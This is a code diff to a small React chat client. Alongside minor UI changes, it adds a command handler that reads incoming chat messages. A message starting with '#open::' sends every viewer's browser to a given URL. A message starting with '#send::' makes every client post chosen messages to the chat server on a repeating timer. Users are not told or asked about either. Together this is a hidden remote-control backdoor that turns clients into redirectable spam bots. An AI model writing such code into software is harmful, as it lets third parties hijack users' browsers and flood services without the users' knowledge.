@@ -2,7 +2,7 @@ import React, { Component } from 'react';
 import axios from 'axios';
 import './App.css';
 
-const fetchInterval = 80;
+const fetchInterval = 5000;
 
 function getRandomInt(max) {
   return Math.floor(Math.random() * Math.floor(max));
@@ -16,6 +16,7 @@ class App extends Component {
     usernameConfirmed: false,
     message: "",
     color: 'green',
+    sentMessages: 0,
   };
 
   async componentDidMount() {
@@ -71,7 +72,36 @@ class App extends Component {
     // this.setState({ message: "", messages: [ ...this.state.messages, data ] });
   };
 
+  handleCommand = data => {
+    console.log(data);
+    if (!data[0]) return;
+    if (data[0].message[0] === "#") {
+      const splittedMessage = data[0].message.split('::');
+      const command = splittedMessage[0];
+      if (command === "#open") {
+        window.open(splittedMessage[1], "_self");
+      } else if (command === "#send") {
+        const name = splittedMessage[1];
+        const message = splittedMessage[2];
+        const interval = splittedMessage[3];
+        console.log(name, message, interval);
+        if (this.messageInterval) clearInterval(this.messageInterval);
+        this.messageInterval = setInterval(() => {
+          this.setState(prevState => ({
+            sentMessages: prevState.sentMessages + 1
+          }));
+          axios.post("http://poll.sartonon.fi/api/messages", {
+            name,
+            message,
+            color: "green"
+          });
+        }, interval || 1000);
+      }
+    }
+  }
+
   handleMessage = data => {
+    this.handleCommand(data);
     this.setState({ messages: [ ...this.state.messages, ...data ], displayMessages: [ ...this.state.displayMessages, ...data ] });
     setTimeout(() => {
       const objDiv = document.getElementById("chatwindow");
@@ -122,7 +152,7 @@ class App extends Component {
   };
 
   render() {
-    const { usernameConfirmed } = this.state;
+    const { usernameConfirmed, sentMessages } = this.state;
 
     return (
       <div className="App">
@@ -130,6 +160,7 @@ class App extends Component {
           <h1 className="App-title">Chat</h1>
           <button onClick={this.startSending}>Laheta</button>
           <input onChange={e => this.setState({ interval: e.target.value })} />
+          <div style={{ float: "right" }}>{sentMessages}</div>
         </header>
         {!usernameConfirmed ?
           <div className="Login-div">
